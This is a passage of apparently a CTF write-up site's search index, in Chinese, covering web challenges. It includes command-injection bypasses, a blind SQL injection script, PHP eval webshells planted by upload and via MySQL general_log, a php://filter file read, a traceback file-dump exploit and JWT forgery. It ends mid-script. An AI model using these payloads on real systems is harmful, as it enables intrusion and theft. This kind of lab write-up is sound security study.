<code>|</code>\u3001<code>&amp;</code>\u3001<code>;</code>\u3001<code>[sapce]</code>\u3001<code>/</code>\u3001<code>cat</code>\u3001<code>flag</code>\u3001<code>tac</code>\u3001<code>php</code>\u3001<code>ls</code></p> <p>shell\u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>l''s</code> \u7ed5\u8fc7 <code>ls</code>\uff0c\u4f7f\u7528 <code>${IFS}</code> \u7ed5\u8fc7\u7a7a\u683c</p> <p>\u6216\u8005\u76f4\u63a5\u7528\u4e0b\u9762\u5b57\u7b26\u4e32\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u5176\u4e2d <code>$payload</code> \u4e3a\u516b\u8fdb\u5236\u6216\u5341\u516d\u8fdb\u5236\u7f16\u7801\u8fc7\u540e\u7684\u547d\u4ee4\u4e32</p> <pre><code>&lt;?php\n'$(printf${IFS}\"'.$payload.'\")'\n</code></pre>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#highlight_file","title":"highlight_file()","text":"<p><pre><code>&lt;?php\nhighlight_file(__FILE__);\n</code></pre> highlight_file() \u51fd\u6570\u5bf9\u6587\u4ef6\u8fdb\u884c PHP \u8bed\u6cd5\u9ad8\u4eae\u663e\u793a\u3002\u8bed\u6cd5\u901a\u8fc7\u4f7f\u7528 HTML \u6807\u7b7e\u8fdb\u884c\u9ad8\u4eae\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_1","title":"\u8bed\u6cd5","text":"<pre><code>&lt;?php\nhighlight_file(filename, return)\n</code></pre> \u53c2\u6570 \u63cf\u8ff0 filename \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u663e\u793a\u7684\u6587\u4ef6\u3002 return \u53ef\u9009\u3002\u5982\u679c\u8be5\u53c2\u6570\u8bbe\u7f6e\u4e3a TRUE\uff0c\u8be5\u51fd\u6570\u5c06\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u8fd4\u56de\u9ad8\u4eae\u663e\u793a\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fdb\u884c\u8f93\u51fa\u3002\u9ed8\u8ba4\u662f FALSE\u3002"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_2","title":"\u6280\u672f\u7ec6\u8282","text":"\u8fd4\u56de\u503c\uff1a \u5982\u679c return \u53c2\u6570\u8bbe\u7f6e\u4e3a TRUE\uff0c\u8be5\u51fd\u6570\u5c06\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u8fd4\u56de\u9ad8\u4eae\u663e\u793a\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fdb\u884c\u8f93\u51fa\u3002\u5426\u5219\uff0c\u5982\u679c\u6210\u529f\u5219\u8fd4\u56de TRUE\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56de FALSE\u3002 PHP \u7248\u672c\uff1a 4+ \u66f4\u65b0\u65e5\u5fd7\uff1a \u81ea PHP 4.2.1 \u8d77\uff0c\u8be5\u51fd\u6570\u73b0\u5728\u4e5f\u53d7 safe_mode \u548c open_basedir \u5f71\u54cd\u3002\u7136\u800c\uff0c\u5728 PHP 5.4 \u4e2d safe_mode \u88ab\u79fb\u9664\u3002      \u5728 PHP 4.2.0 \u4e2d\u65b0\u589e\u4e86 return \u53c2\u6570\u3002"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#preg_match_all","title":"preg_match_all()","text":"<p><pre><code>&lt;?php\npreg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)\n</code></pre> preg_match_all \u51fd\u6570\u7528\u4e8e\u6267\u884c\u4e00\u4e2a\u5168\u5c40\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_3","title":"\u8bed\u6cd5","text":"<pre><code>&lt;?php\nint preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] )\n</code></pre> <p>\u641c\u7d22 subject \u4e2d\u6240\u6709\u5339\u914d pattern \u7ed9\u5b9a\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\u7ed3\u679c\u5e76\u4e14\u5c06\u5b83\u4eec\u4ee5 flag \u6307\u5b9a\u987a\u5e8f\u8f93\u51fa\u5230 matches \u4e2d\u3002</p> <p>\u5728\u7b2c\u4e00\u4e2a\u5339\u914d\u627e\u5230\u540e, \u5b50\u5e8f\u5217\u7ee7\u7eed\u4ece\u6700\u540e\u4e00\u6b21\u5339\u914d\u4f4d\u7f6e\u641c\u7d22\u3002</p> <p>\u53c2\u6570\u8bf4\u660e\uff1a</p> <ul> <li>$pattern: \u8981\u641c\u7d22\u7684\u6a21\u5f0f\uff0c\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002</li> <li>$subject: \u8f93\u5165\u5b57\u7b26\u4e32\u3002</li> <li>$matches: \u591a\u7ef4\u6570\u7ec4\uff0c\u4f5c\u4e3a\u8f93\u51fa\u53c2\u6570\u8f93\u51fa\u6240\u6709\u5339\u914d\u7ed3\u679c, \u6570\u7ec4\u6392\u5e8f\u901a\u8fc7flags\u6307\u5b9a\u3002</li> <li>$flags\uff1a\u53ef\u4ee5\u7ed3\u5408\u4e0b\u9762\u6807\u8bb0\u4f7f\u7528(\u6ce8\u610f\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528PREG_PATTERN_ORDER\u548c PREG_SET_ORDER)\uff1a</li> </ul> <pre><code>1. PREG_PATTERN_ORDER: \u7ed3\u679c\u6392\u5e8f\u4e3a$matches[0]\u4fdd\u5b58\u5b8c\u6574\u6a21\u5f0f\u7684\u6240\u6709\u5339\u914d, $matches[1] \u4fdd\u5b58\u7b2c\u4e00\u4e2a\u5b50\u7ec4\u7684\u6240\u6709\u5339\u914d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\n\n2. PREG_SET_ORDER: \u7ed3\u679c\u6392\u5e8f\u4e3a$matches[0]\u5305\u542b\u7b2c\u4e00\u6b21\u5339\u914d\u5f97\u5230\u7684\u6240\u6709\u5339\u914d(\u5305\u542b\u5b50\u7ec4)\uff0c $matches[1]\u662f\u5305\u542b\u7b2c\u4e8c\u6b21\u5339\u914d\u5230\u7684\u6240\u6709\u5339\u914d(\u5305\u542b\u5b50\u7ec4)\u7684\u6570\u7ec4\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\n\n3. PREG_OFFSET_CAPTURE: \u5982\u679c\u8fd9\u4e2a\u6807\u8bb0\u88ab\u4f20\u9012\uff0c\u6bcf\u4e2a\u53d1\u73b0\u7684\u5339\u914d\u8fd4\u56de\u65f6\u4f1a\u589e\u52a0\u5b83\u76f8\u5bf9\u76ee\u6807\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u91cf\u3002\n</code></pre> <ul> <li>offset: \u901a\u5e38\uff0c \u67e5\u627e\u65f6\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\u5f00\u59cb\u3002\u53ef\u9009\u53c2\u6570offset\u7528\u4e8e \u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u4e2d\u6307\u5b9a\u4f4d\u7f6e\u5f00\u59cb\u641c\u7d22(\u5355\u4f4d\u662f\u5b57\u8282)\u3002</li> </ul>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#in_array","title":"in_array()","text":"<p><pre><code>&lt;?php\nin_array($this-&gt;method, array(\"ping\"))\n</code></pre> in_array() \u51fd\u6570\u641c\u7d22\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u6307\u5b9a\u7684\u503c\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_4","title":"\u8bed\u6cd5","text":"<pre><code>&lt;?php\nbool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )\n</code></pre> \u53c2\u6570 \u63cf\u8ff0 needle \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u5728\u6570\u7ec4\u641c\u7d22\u7684\u503c\u3002 haystack \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u641c\u7d22\u7684\u6570\u7ec4\u3002 strict \u53ef\u9009\u3002\u5982\u679c\u8be5\u53c2\u6570\u8bbe\u7f6e\u4e3a TRUE\uff0c\u5219 in_array() \u51fd\u6570\u68c0\u67e5\u641c\u7d22\u7684\u6570\u636e\u4e0e\u6570\u7ec4\u7684\u503c\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_5","title":"\u6280\u672f\u7ec6\u8282","text":"\u8fd4\u56de\u503c\uff1a \u5982\u679c\u5728\u6570\u7ec4\u4e2d\u627e\u5230\u503c\u5219\u8fd4\u56de TRUE\uff0c\u5426\u5219\u8fd4\u56de FALSE\u3002 PHP \u7248\u672c\uff1a 4+ \u66f4\u65b0\u65e5\u5fd7 \u81ea PHP 4.2 \u8d77\uff0csearch \u53c2\u6570\u53ef\u4ee5\u662f\u4e00\u4e2a\u6570\u7ec4\u3002"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#call_user_func_array","title":"call_user_func_array()","text":"<p><pre><code>&lt;?php\ncall_user_func_array(array($this, $this-&gt;method), $this-&gt;args);\n</code></pre> \u8c03\u7528\u56de\u8c03\u51fd\u6570\uff0c\u5e76\u628a\u4e00\u4e2a\u6570\u7ec4\u53c2\u6570\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_6","title":"\u8bf4\u660e","text":"<pre><code>&lt;?php\ncall_user_func_array(callable $callback, [array] $args): [mixed]\n</code></pre> <p>\u628a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\uff08<code>callback</code>\uff09\u8c03\u7528\uff0c\u628a\u53c2\u6570\u6570\u7ec4\u4f5c\uff08<code>args</code>\uff09\u4e3a\u56de\u8c03\u51fd\u6570\u7684\u7684\u53c2\u6570\u4f20\u5165\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_7","title":"\u53c2\u6570","text":"<pre><code>callback\n</code></pre> <p>\u88ab\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>args\n</code></pre> <p>\u8981\u88ab\u4f20\u5165\u56de\u8c03\u51fd\u6570\u7684\u6570\u7ec4\u3002 \u5982\u679c <code>args</code> \u7684 key \u90fd\u662f\u6570\u5b57\uff0c\u5219\u4f1a\u5ffd\u7565 key\uff0c\u5e76\u6309\u987a\u5e8f\u5c06\u6bcf\u4e2a\u5143\u7d20\u4f5c\u4e3a\u4f4d\u7f6e\u53c2\u6570\u4f20\u9012\u7ed9 <code>callback</code> \u3002 \u5982\u679c <code>args</code> \u7684\u4efb\u4e00 key \u662f\u5b57\u7b26\u4e32\uff0c\u5219\u8fd9\u4e9b\u5143\u7d20\u5c06\u4f5c\u4e3a\u547d\u540d\u53c2\u6570\u4f20\u9012\u7ed9 <code>callback</code>\uff0c\u540d\u79f0\u7531 key \u6307\u5b9a\u3002 \u5728 <code>args</code> \u4e2d\uff0c\u5982\u679c\u6570\u5b57 key \u5728 \u5b57\u7b26\u4e32 key \u4e4b\u540e\u51fa\u73b0\uff0c\u6216\u8005\u5b57\u7b26\u4e32 key \u4e0e <code>callback</code> \u7684\u4efb\u4f55\u53c2\u6570\u540d\u79f0\u4e0d\u5339\u914d\uff0c\u5c06\u4f1a\u5bfc\u81f4 fatal error\u3002</p>"},{"location":"web/%5B%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF%5D%20unseping/#_8","title":"\u8fd4\u56de\u503c","text":"<p>\u8fd4\u56de\u56de\u8c03\u51fd\u6570\u7684\u7ed3\u679c\u3002\u5982\u679c\u51fa\u9519\u7684\u8bdd\u5c31\u8fd4\u56de <code>false</code></p> <p> by. Spark0618 </p>"},{"location":"web/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5D%20unfinish/","title":"[\u7f51\u9f0e\u676f 2018] unfinish","text":"<p>\u53d1\u73b0\u6ce8\u518c\u9875</p> <p></p> <p>\u6ce8\u5165username\u5b57\u6bb5\u6210\u529f</p> <p></p> <p>\u7f16\u5199\u4e8c\u5206\u65f6\u95f4\u76f2\u6ce8\u811a\u672c</p> <pre><code>import requests\nimport time\n\nurl = \"http://61.147.171.35:65370/register.php\"\ndata = {\n\u00a0 \u00a0 'email': 'spark@panic404.cn',\n\u00a0 \u00a0 'username': '',\n\u00a0 \u00a0 'password': '1'\n}\n\ndef inject_post():\n\u00a0 \u00a0 result=\"\"\n\u00a0 \u00a0 s = requests.Session()\n\u00a0 \u00a0 \n\u00a0 \u00a0 # \u4e8c\u5206\u641c\u7d22\n\u00a0 \u00a0 for i in range(1,1000):\n\u00a0 \u00a0 \u00a0 \u00a0 # \u53ef\u6253\u5370\u5b57\u7b26\u8303\u56f4\n\u00a0 \u00a0 \u00a0 \u00a0 low=32\n\u00a0 \u00a0 \u00a0 \u00a0 high=128\n\u00a0 \u00a0 \u00a0 \u00a0 mid=(low+high)//2\n\n\u00a0 \u00a0 \u00a0 \u00a0 while low&lt;high:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 payload=f\"0'+(CASE WHEN ascii(substr((select * from flag) from {i} for 1))&lt;{mid} THEN sleep(1) ELSE 1 END)+'0\"\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 data['username'] = payload\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 data['email'] = f\"{i}_{mid}@b.com\"\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 start_time=time.time()\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 s.post(url=url,data=data,verify=False,allow_redirects=False) # \u4e0d\u8ddf\u968f\u91cd\u5b9a\u5411\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 end_time=time.time()\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if end_time-start_time&gt;1:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 high=mid\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 else:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 low=mid+1\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mid=(low+high)//2\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \n\u00a0 \u00a0 \u00a0 \u00a0 if mid&lt;33 or mid&gt;127:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 break\n\u00a0 \u00a0 \u00a0 \u00a0 result += chr(mid-1)\n\u00a0 \u00a0 \u00a0 \u00a0 print(result)\n\ninject_post()\n</code></pre> <p>\u8f93\u51fa</p> <p></p> <p> by. Spark0618 </p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/","title":"bugku-awd\u5c0f\u8bb010.7","text":""},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#web","title":"Web","text":"<p>Subrion CMS 4.1.4</p> <p>\u5148\u628a\u6e90\u7801copy\u4e0b\u6765\uff0c\u62ffD\u76fe\u626b\u4e00\u904d</p> <p></p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#1","title":"1.\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"<p>fix\uff1a\u76f4\u63a5\u5220\u9664</p> <p></p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#2","title":"2.\u5f31\u53e3\u4ee4+\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u7ba1\u7406\u5458\u540e\u53f0\u7684\u8d26\u6237\u5bc6\u7801\u662fadmin/admin\uff0c\u540c\u65f6\u53ef\u4ee5\u4ececonfig.inc.php \u4e2d\u5f97\u5230\u6570\u636e\u5e93\u5bc6\u7801</p> <p>fix\uff1a\u6539admin\u5f31\u5bc6\u7801</p> <p></p> <p>\u7136\u540e\u767b\u5f55\u540e\u53f0\u770b\u5230\u53ef\u4ee5upload\uff0c\u6240\u4ee5\u653b\u51fb\u65f6\u8003\u8651\u4f20\u9a6c</p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#3sql","title":"3.sql\u6ce8\u5165","text":"<p>\u5728panel\u91cc</p> <p></p> <p>Database\u5904\u53ef\u4ee5\u8fdb\u884cSQL\u6ce8\u5165\uff0c\u4e0d\u8fc7flag\u662f\u9519\u7684</p> <p></p> <p>\u8fd9\u91cc\u53bb\u7fa4\u91cc\u5439\u6c34\u53bb\u4e86\uff0c\u6ca1\u6765\u5f97\u53ca\u4fee</p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#attack","title":"attack\uff1a","text":""},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#1_1","title":"1.\u6587\u4ef6\u5305\u542b","text":"<p>\u8bbf\u95ee\uff0c\u76f4\u63a5\u80fd\u8bfb\u5230flag</p> <pre><code>http://192-168-1-67.pvp6715.bugku.cn/game/index.php/?file=php://filter/convert.base64-encode/resource=/flag\n</code></pre>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#2_1","title":"2.\u4f20\u9a6c","text":"<p>\u4e0a\u4f20\u70b9\uff1a/panel/uploads</p> <p>\u4f20a.pht</p> <pre><code>GIF89a\n&lt;?php  @eval($_REQUEST['huaji']);?&gt;\n</code></pre> <p>\u4e4b\u540e\u8bbf\u95ee\u5373\u53ef\u3002</p> <p></p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#3sql_1","title":"3.sql\u6ce8\u5165","text":"<p>panel\u91cc\u7684database\uff0c\u5148\u5f00\u542fgeneral_log</p> <pre><code>set global general_log=on;\n</code></pre> <p>\u7136\u540e\u8ba9\u4ed6\u5199\u9a6c\u8fdb\u53bb\uff0c\u8bbe\u7f6e\u7684\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84</p> <pre><code>set global general_log_file=\"/var/www/html/set_config.php\";\nselect '&lt;?phpeval($_REQUEST[yunsee])?&gt;';\n</code></pre> <p>\u8fd9\u6837\u4e5f\u53ef\u4ee5\u5199\u9a6c\u8fdb\u53bb</p> <p></p>"},{"location":"web/bugku-awd%E5%B0%8F%E8%AE%B0-10.7/#pwn","title":"PWN","text":"<p>\u961f\u53cb\u51fa\u7684\uff0cret2text\uff0c\u7b7e\u5230\u9898</p> <p>\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\u3002</p> <p></p> <p>fix\u7684\u5185\u5bb9\u6ca1\u53d1\u51fa\u6765\uff0c\u5c31\u4e0d\u5199\uff08\u6284\uff09\u4e86</p> <p> by. HuajiHD </p>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/","title":"\u5c01\u795e\u53f0","text":""},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#wp","title":"\u5c01\u795e\u53f0wp","text":""},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezecho","title":"EzEcho","text":"<p>bun \u5185\u90e8shell\u7684\u89e3\u6790bug</p> <p>\u5148\u521b\u5efa\u6587\u4ef6\u5e76\u5c06\u5185\u5bb9\u5199\u5165sh\u811a\u672c\u91cc\u9762\uff0c\u7136\u540e\u518d\u6267\u884csh</p> <p>\u597d\u50cf\u662f<code>1</code> \u88ab\u5f53\u4f5c\u89e6\u53d1\u91cd\u5b9a\u5411\u7684\u6807\u8bc6\uff0c\u6ca1\u6709\u5199\u5165\uff0c\u4f5c\u4e3a\u6587\u672c\u5185\u5bb9\u3002</p> <pre><code>/readflag1&lt;huaji\n\n`sh&lt;huaji`\n</code></pre> <p>flag{rce_eas1y_th3n_i_think}</p> <p>\u53c2\u8003https://blog.csdn.net/2401_83799022/article/details/141859729</p>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezpyeditor","title":"EzPyeditor","text":"<p>\u56e0\u4e3a <code>traceback.format_exc()</code> \u4f1a\u628a \u5f02\u5e38\u6808\u7684\u6587\u4ef6\u8def\u5f84\u548c\u4ee3\u7801\u4e0a\u4e0b\u6587 \u8fd4\u56de\u7ed9\u524d\u7aef\uff0c\u5982\u679c\u6211\u4eec\u628a <code>filename</code> \u6307\u5411 <code>secret.py</code>\uff0c\u5e76\u4e14\u8ba9 <code>source</code> \u662f\u7a7a\u7684\uff08\u89e6\u53d1\u89e3\u6790\u62a5\u9519\uff09\uff0c\u90a3\u4e48 traceback \u4f1a\u5c1d\u8bd5 \u4ece\u8fd9\u4e2a\u6587\u4ef6\u52a0\u8f7d\u6e90\u7801\u884c\u5185\u5bb9\uff0c\u4ece\u800c\u628a <code>secret.py</code> \u91cc\u7684 flag \u6cc4\u9732\u51fa\u6765\u3002</p> <p>\u53ef\u4ee5\u7528 <code>source</code> \u6784\u9020\u4e00\u4e2a\u5728\u6307\u5b9a\u884c\u89e6\u53d1\u9519\u8bef\u7684\u5047\u4ee3\u7801\uff0c\u8ba9 traceback \u53bb\u90a3\u4e00\u884c\u8bfb\u53d6\u5185\u5bb9\uff1a</p> <pre><code>{\n    \"source\": \"\\n\\n\\n\\nx y\",  \n    \"filename\": \"secret.py\"\n}\n</code></pre> <p>\u6240\u4ee5exp\u5982\u4e0b\uff1a</p> <pre><code>import requests\nimport re\n\nurl = \"http://rc0uy94d.lab.aqlab.cn/check\"   # \u6539\u6210\u4f60\u7684\u9776\u573a\u5730\u5740\ntarget_file = \"secret.py\"\n\ndef read_line(line_num):\n    # \u6784\u9020 source\uff0c\u8ba9\u9519\u8bef\u51fa\u73b0\u5728\u6307\u5b9a\u884c\n    payload = {\n        \"source\": \"\\n\" * (line_num - 1) + \"x y\",  # x y \u89e6\u53d1\u8bed\u6cd5\u9519\u8bef\n        \"filename\": target_file\n    }\n    r = requests.post(url, json=payload)\n    data = r.json()\n    if not data[\"status\"] and data[\"error\"]:\n        # \u4ece traceback \u4e2d\u63d0\u53d6\u5bf9\u5e94\u884c\n        match = re.search(rf'File \"{re.escape(target_file)}\", line {line_num}\\n\\s*(.*)\\n', data[\"error\"])\n        if match:\n            return match.group(1)\n    return None\n\ndef dump_file(max_lines=100):\n    print(f\"[*] Dumping {target_file} ...\")\n    for i in range(1, max_lines+1):\n        line = read_line(i)\n        if line is None:\n            break\n        print(f\"{i:03d}: {line}\")\n\nif __name__ == \"__main__\":\n    dump_file()\n#flag{y0ur_1re_pyc0de_master!}\n</code></pre>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezgrades","title":"EzGrades","text":"<p>\u521b\u5efa\u7528\u6237\u65f6\uff0c\u52a0\u4e0ais_teacher=true\u5373\u53ef</p> <p></p> <p>\u7136\u540e\u518d\u8bbf\u95ee/grades_flag\u5c31\u6709flag\u4e86\uff0c\u5176\u4e2dcookie\u662f<code>auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoiaHVhamkiLCJzdHVfZW1haWwiOiJodWFqaUBodWFqaS5jb20iLCJwYXNzd29yZCI6IjEiLCJpc190ZWFjaGVyIjoidHJ1ZSJ9.4bhDOIr-X_u68snoXl5pwMG-v0HGMXyi7nzAXp62GrY</code></p> <p>flag{g00d_go0d_study_d1yd1yup}</p>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezgetflag","title":"EzGetFlag","text":"<p>\u4f7f\u7528 \u4e24\u4e2a\u5b57\u6bb5\uff1a</p> <p>\u7b2c\u4e00\u4e2a \u7ed9 Flask \u770b\uff0c\u7b2c\u4e8c\u4e2a\u7ed9 PHP \u770b</p> <p>\u56e0\u4e3aphp\u4f1a\u88ab\u53d8\u91cf\u7ed5\u8fc7\uff0cflask\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\uff0cphp\u76f8\u5f53\u4e8e\u63a5\u6536\u7684\u7b2c\u4e8c\u4e2a</p> <p></p>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezjwt-wp","title":"EzJwt Wp","text":"<pre><code>const algorithms = {\n    hs256: (data, secret) =&gt; \n        base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),\n    hs512: (data, secret) =&gt; \n        base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),\n}\nconst createSignature = (header, payload, secret) =&gt; {\n    const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;\n    const signature = algorithms[header.alg.toLowerCase()](data, secret);\n    return signature;\n}\n\nconst verify = (token, secret) =&gt; {\n    const { header, payload, signature: expected_signature } = parseToken(token);\n    const calculated_signature = createSignature(header, payload, secret);\n\n    const calculated_buf = Buffer.from(calculated_signature, 'base64');\n  console.log(calculated_buf)\n  console.log(calculated_buf.toString('base64'))\n    const expected_buf = Buffer.from(expected_signature, 'base64');\n  console.log(expected_buf)\n\n    if (Buffer.compare(calculated_buf, expected_buf) !== 0) {\n        throw Error('Invalid signature');\n    }\n\n    return payload;\n}\n</code></pre> <p>\u4ee3\u7801\u5ba1\u8ba1\uff0c\u53d1\u73b0\u540e\u7aef\u5728\u6821\u9a8c JWT \u65f6\u6ca1\u6709\u5236\u5b9a\u52a0\u5bc6\u7b97\u6cd5\uff0c\u4e8e\u662f\u60f3\u5230\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a alg \u6807\u7b7e\u6765\u4f7f\u5f97\u540e\u7aef\u4e0d\u4f7f\u7528\u90a3\u4e24\u79cd\u52a0\u5bc6\u7b97\u6cd5\u6765\u8fdb\u884c\u9a8c\u8bc1\uff0c\u4f46\u662f\u95ee\u9898\u662f <code>algorithms</code> \u53ea\u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 JS \u7684\u7279\u6027\u627e\u5230\u4e00\u4e2a <code>Object</code> \u6216\u8005 <code>{}</code> \u5bf9\u8c61\u672c\u6765\u5c31\u5177\u6709\u7684\u51fd\u6570\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u6211\u9009\u62e9\u4f7f\u7528 <code>constructor()</code>\uff0c\u76f4\u63a5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff1a</p> <pre><code>  &gt; let a = {}\n... a['constructor'](\"123\",\"456\")\nString\u00a0{'123'}\n</code></pre> <p>\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u601d\u8def\u53ef\u884c\u540e\uff0c\u5c31\u76f4\u63a5\u4fee\u6539\u672c\u5730\u4ee3\u7801\u83b7\u5f97\u7b7e\u540d\u4e4b\u540e\u7684 base64\u3002</p> <p></p> <p>\u4fee\u6539\u540e\uff1a</p> <pre><code>ewogICJhbGciOiAiY29uc3RydWN0b3IiLAogICJ0eXAiOiAiSldUIgp9.ewogICJpc0FkbWluIjogdHJ1ZQp9.eyJhbGciOiJjb25zdHJ1Y3RvciIsInR5cCI6IkpXVCJ9eyJpc0FkbWluIjp0cnVlfQ\n</code></pre> <p>\u4f7f\u7528\u8fd9\u4e2a cookie \u53bb\u8bbf\u95ee\u7f51\u7ad9\uff0c\u62ff\u5230 cookie\uff1a</p> <p></p> <p>flag \u4e3a\uff1a</p> <pre><code>flag{jwt_i_w0nt_see_you!:(}\n</code></pre>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#ezbase-wp","title":"EzBase Wp","text":"<p>\u4ee3\u7801\u5ba1\u8ba1\uff0c\u53d1\u73b0\u9898\u76ee\u4f1a\u5c06\u7528\u6237\u4e0a\u4f20\u7684\u6570\u636e\u8fdb\u884c base91 \u7f16\u7801\uff0c\u7136\u540e\u663e\u793a\u51fa\u6765\uff0c\u4e8e\u662f\u9006\u5411\u601d\u7ef4\uff0c\u8ba9\u7f16\u7801\u540e\u7684\u6587\u672c\u4e3a xss payload\uff0c\u518d decode\uff0c\u5c31\u80fd\u62ff\u5230\u5e94\u8be5\u4e0a\u4f20\u7684\u6570\u636e\u3002</p>"},{"location":"web/%E5%B0%81%E7%A5%9E%E5%8F%B0/#exp","title":"exp","text":"<pre><code>import based91\n\nres = 